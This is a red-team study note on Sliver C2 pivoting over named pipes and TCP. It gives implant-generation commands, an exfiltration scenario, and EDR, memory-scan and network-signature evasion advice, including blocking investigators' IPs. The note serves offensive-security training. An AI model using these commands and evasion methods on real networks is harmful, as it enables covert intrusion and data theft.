---
tags: [sliver, c2, red-team, vapt]
difficulty: intermediate
module: "95 - Sliver C2 Advanced Deployment and Profiles"
topic: "95.13 Sliver Pivot Listeners and Internal Routing"
---

# 95.13 Sliver Pivot Listeners and Internal Routing

## Introduction to Internal Routing
Once an initial foothold is established in a target network, operators must expand their access (lateral movement) while remaining stealthy. Having every compromised internal host beacon directly to the external internet is a massive OPSEC failure. It multiplies the external network noise, dramatically increasing the likelihood of detection by egress firewalls and SOC monitoring.

Sliver solves this through **Pivot Listeners** and **Internal Routing**. By turning an internal compromised host into a C2 proxy (a pivot point), other hosts deep within the network can communicate with the external C2 server indirectly. Sliver supports two primary peer-to-peer (P2P) pivot mechanisms: Named Pipes (SMB) and TCP.

## Named Pipes (SMB Pivots)
Named pipes provide a robust, highly evasive communication channel for Windows environments. By leveraging the SMB protocol (port 445), which is notoriously prevalent and necessary in Active Directory environments, beacon traffic blends in perfectly with normal Windows file-sharing and RPC traffic.

### Configuring a Named Pipe Pivot
Assume we have an active session (Session ID: `5c3a2b1`) on a perimeter host (`WEB-SRV-01`). We want to use this host to pivot traffic from internal database servers.

1. **Start the Pivot Listener on the Active Session:**
   We instruct the compromised host to open a named pipe listener.
   ```bash
   sliver (WEB-SRV-01) > pivot named-pipe --bind \\.\pipe\msexchange_sync
   [*] Started named pipe pivot listener on \\.\pipe\msexchange_sync
   ```
   *OPSEC Tip:* Name your pipe something that mimics legitimate Windows services, like `msexchange_sync`, `sqlquery`, or `mojo_core`.

2. **Generate a P2P Implant:**
   Now, we generate an implant that connects to this pipe instead of an external IP.
   ```bash
   sliver > generate --named-pipe WEB-SRV-01\\pipe\\msexchange_sync --os windows --arch amd64 --save /tmp/db_pivot.exe
   ```

3. **Deploy and Execute:**
   Transfer `/tmp/db_pivot.exe` to the target internal host (`DB-SRV-01`) via lateral movement techniques (PsExec, WMI) and execute it. The new implant will connect to `WEB-SRV-01` over SMB, and `WEB-SRV-01` will route the data over its existing external HTTPS connection.

## TCP Pivots
In environments where SMB is restricted (or on Linux/macOS networks where Named Pipes are inapplicable), TCP pivots are the alternative. TCP pivots bind to a specific internal port and wait for connections from other implants.

### Configuring a TCP Pivot
```bash
sliver (LINUX-APP-01) > pivot tcp --bind 0.0.0.0:8443
[*] Started TCP pivot listener on 0.0.0.0:8443

# Generating the payload for the internal target
sliver > generate --tcp 10.10.50.25:8443 --os linux --arch amd64 --save /tmp/internal_tcp_implant
```

## ASCII Diagram: Multi-Tiered Internal Routing

```text
    [ Deep Internal Network ]             [ Perimeter / DMZ ]               [ Internet ]
    
    +-------------------+                 +-------------------+             +----------------+
    |                   |                 |                   |             |                |
    |  DB-SRV-01        |  SMB Port 445   |  WEB-SRV-01       | HTTPS 443   | Sliver C2      |
    |  (Peer Implant)   |================>|  (Edge Implant)   |============>| Server         |
    |                   |  Named Pipe     |                   |             |                |
    +--------^----------+  \pipe\sqlsync  +---------^---------+             +----------------+
             |                                      |
             |                                      |
             |                                      |
    +--------+----------+                 +---------+---------+
    |                   |  TCP Port 8443  |                   |
    |  APP-SRV-02       |================>|  LINUX-APP-01     |
    |  (Peer Implant)   |  Raw TCP Data   |  (Peer Implant)   |
    |                   |                 |                   |
    +-------------------+                 +-------------------+
```
*In this diagram, `WEB-SRV-01` is the only machine talking to the internet. `DB-SRV-01` connects via SMB to `WEB-SRV-01`. Furthermore, `APP-SRV-02` connects via TCP to `LINUX-APP-01`, which in turn routes through `WEB-SRV-01`. Sliver dynamically handles this multi-tiered routing.*

## Real-World Attack Scenario

### The Air-Gapped Database Network
During a red team assessment, the target was an e-commerce platform. Initial access was secured via an SSRF vulnerability leading to RCE on a DMZ web server (`WEB-01`). This server had outbound internet access but held no sensitive data.

The critical target was the customer database (`CUST-DB-01`), residing in a strictly segregated VLAN with absolutely no internet access. Egress rules strictly blocked HTTP, DNS, and ICMP from the database subnet.

### The Pivot Execution
1. The operators dropped an HTTPS Sliver implant onto `WEB-01` and established external C2.
2. Reconnaissance from `WEB-01` revealed port 445 (SMB) was open between the DMZ and the database VLAN for legacy backup processes.
3. The Red Team initiated a Named Pipe pivot on `WEB-01` using the pipe name `\\.\pipe\VeeamBackupTransport`.
4. Using stolen database administrator credentials obtained from `WEB-01`'s memory, the operators laterally moved to `CUST-DB-01` via WMI and executed a P2P named pipe implant.
5. The `CUST-DB-01` implant connected to `WEB-01` over SMB. `WEB-01` seamlessly forwarded the encrypted C2 traffic to the external Sliver server.

The operators successfully dumped the customer database schemas and exfiltrated the data without a single byte of internet-bound traffic originating from the heavily monitored database subnet.

## OPSEC Considerations and Defense Evasion

- **Orphaned Implants:** If the edge implant (`WEB-SRV-01`) dies or is quarantined by an EDR, all downstream internal implants lose their connection. Red Teams must deploy redundant edge nodes.
- **Pipe Sweeping:** Defensive tools occasionally sweep for anomalous named pipes. By default, Sliver randomizes pipe names if not specified, which can look highly suspicious (e.g., `\\.\pipe\9a8b7c6d`). Always specify a deceptive, context-aware pipe name.
- **SMB Traffic Profiling:** While SMB is common, large amounts of data (like file exfiltration or memory dumps) over a named pipe might trigger anomalous internal traffic alerts in NDR (Network Detection and Response) tools like Zeek or ExtraHop.

## Network Graph Visualization in Sliver
Sliver includes a built-in network graph representation that makes managing complex pivot chains easy.
By running the command:
```bash
sliver > aliases network-graph
```
(If a custom alias/extension is configured, or by leveraging the web UI/Armory tools), operators can visually trace the path of beacons from the deepest network segment out to the C2 server.

## Chaining Opportunities
- **Automated Deployment:** Python scripting can be used to automatically detect new subnets and deploy P2P listeners dynamically. See [[15 - Automating Sliver Operations with Python Scripting]].
- **Defense Evasion:** Pivot implants must also be heavily obfuscated, as they are dropped onto internal servers that likely run robust EDR solutions. See [[14 - Bypassing EDRs with Sliver Custom Compiles]].

## Related Notes
- [[11 - Sliver C2 HTTP Profiles mimicking legitimate traffic]]
- [[14 - Bypassing EDRs with Sliver Custom Compiles]]
- [[82 - Active Directory Lateral Movement Techniques]]
- [[44 - Protocol Tunneling and Proxies]]

## Extended Technical Reference and Advanced Troubleshooting

### Deep Dive into Infrastructure Resiliency
When conducting long-term, high-stakes engagements (such as APT simulations or extended Red Team operations), the resiliency of your Command and Control infrastructure is paramount. A single point of failure can lead to the loss of all deployed implants, potentially burning weeks of effort.

#### Redundant Redirectors
Always deploy multiple distinct redirectors pointing back to your team server. 
- **Primary Route:** Used for daily check-ins and high-jitter beaconing.
- **Secondary Route:** A fallback domain, perhaps using a completely different protocol (like DNS or Domain Fronting), that the implant attempts to contact only if the primary route fails for 48 consecutive hours.
- **Tertiary Route:** An extremely low-and-slow fallback, beaconing once a week via a compromised third-party service (e.g., Slack or Microsoft Graph API C2).

#### Automating Infrastructure Rollout
Use Terraform or Ansible to deploy your redirectors. If a Blue Team burns your IP, you should be able to spin up a new Nginx proxy, attach an elastic IP, and provision a new Let's Encrypt certificate in under 5 minutes.

### Advanced Evasion Techniques

#### Memory Scanning Evasion
Modern EDRs perform routine memory scans, looking for known signatures (like standard Sliver strings) sitting in `PAGE_EXECUTE_READWRITE` memory.
- **Sleep Obfuscation:** Advanced loaders implement techniques like `Ekko` or `FOLIAGE` to encrypt the implant's memory space while it is sleeping. The implant decrypts itself, executes its task, and re-encrypts itself before calling `Sleep()`.
- **Module Stomping:** Instead of allocating new memory, the loader hollows out a legitimate DLL loaded in the process space (e.g., `xpsprint.dll`) and injects the Sliver shellcode into that space. This bypasses heuristics looking for anomalous unbacked executable memory.

#### Network Signature Evasion
- **JA3/JA3S Fingerprinting:** The TLS handshake itself leaves a fingerprint. Sliver's default Go HTTP client has a specific JA3 hash. By compiling the implant to use the native Windows WinINET/WinHTTP APIs, the TLS handshake will exactly match the host OS's native traffic, neutralizing JA3-based detections.
- **Beacon Jitter:** A mathematically perfect 60-second beacon interval is easily detectable by simple statistical analysis (e.g., RITA or Zeek). Always configure a jitter of at least 25-30% to introduce randomness.

### Comprehensive Troubleshooting Checklist

1. **Firewall Configurations:**
   - Have you verified that port 443 is open on your team server?
   - Is the cloud provider's security group allowing inbound UDP/53 (for DNS) and TCP/443 (for HTTPS)?
   - Are internal host firewalls (Windows Defender Firewall) blocking the named pipe or TCP bind port?

2. **Certificate Validation:**
   - If using mTLS, check that the client config hasn't expired.
   - For HTTPS C2, ensure the Let's Encrypt certificate is correctly mounted in the Nginx reverse proxy.
   - Check if the target environment employs SSL/TLS inspection. If so, your custom cert might be replaced by the corporate proxy, breaking pinning.

3. **Implant Execution Issues:**
   - Did the shellcode runner allocate memory with `PAGE_EXECUTE_READWRITE`? (Consider `PAGE_READWRITE` followed by `VirtualProtect` to `PAGE_EXECUTE_READ`).
   - Is the process architecture matching the implant? (Don't inject x64 shellcode into a SysWOW64 process).
   - Are dependencies missing on the target? (Go binaries are usually statically linked, but custom loaders might require certain MSVC runtimes if not compiled correctly).

### Logging and Telemetry

To ensure proper OPSEC, Red Teams must monitor their own infrastructure for Blue Team probing.

**Nginx Access Logs (Red Team Monitoring):**
```bash
tail -f /var/log/nginx/access.log | grep -v "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 Edg/114.0.1823.58"
```
*This command filters out your expected C2 traffic, allowing you to instantly see if a threat hunter is curling your endpoint with a default curl User-Agent. If you see anomalous probing, dynamically update Nginx to block the investigator's IP.*

**Sliver Server Logs:**
Enable debug logging on the Sliver team server if implants are failing to check-in:
```bash
Sliver Server > debug --enable
```
Examine the `~/.sliver/logs/sliver.log` file. Look for TLS handshake errors, which indicate either a proxy interception or a mismatched profile.

### Recommended Tooling Integration
- **Cobalt Strike:** While Sliver is powerful, it is often used as a fallback C2. You can use Sliver to drop a Cobalt Strike Beacon if the environment is determined to be safe.
- **BloodHound:** Always pipe your active sessions through a BloodHound ingestor (like SharpHound) to maintain an up-to-date map of lateral movement paths.
- **Sysmon:** In your lab environment, install Sysmon with SwiftOnSecurity's config to see exactly what your Sliver implants look like to defenders.

### Artifact Cleanup

Upon completion of the engagement, ensure all artifacts are safely removed to prevent leaving the client vulnerable.
1. Terminate all active sessions from the Sliver console.
2. If custom services or registry keys were created for persistence, issue commands to delete them before terminating the session.
3. Shred the implant binaries on disk using `sdelete` or equivalent.
4. Revoke the SSL certificates and decommission the Nginx redirectors to prevent domain takeover or misuse by actual threat actors.

### Final Thoughts on Malleability
The true power of any C2 framework lies not in its built-in features, but in its malleability. The ability to look like something you are not—be it a Microsoft API, a DNS query, or an internal backup process—is the essence of modern red teaming. Keep your profiles updated, rotate your domains, and always assume the blue team is watching.

---
*End of Note.*
